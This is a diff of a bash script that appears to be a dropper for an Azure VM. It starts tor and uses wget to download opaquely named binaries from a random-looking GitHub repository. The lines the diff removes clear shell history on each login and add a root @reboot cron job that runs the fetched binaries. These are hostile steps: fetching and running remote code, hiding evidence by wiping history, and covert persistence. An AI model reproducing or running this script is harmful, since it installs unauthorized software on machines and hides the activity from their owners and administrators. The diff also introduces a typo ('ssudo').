@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo systemctl start tor
+ssudo systemctl start tor
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo
 
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2
@@ -10,10 +10,4 @@ wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkf
 
 tar -xf euocean.tar.gz
 rm -r euocean.tar.gz
-sudo systemctl enable cron
-echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
-echo ". history -cw" >> ~/.bashrc
-cat /dev/null > ~/.bash_history
-history -cw
-sudo crontab -l | { cat; echo "@reboot /home/azureuser/cpo2 & /home/azureuser/crp2"; } | crontab
 
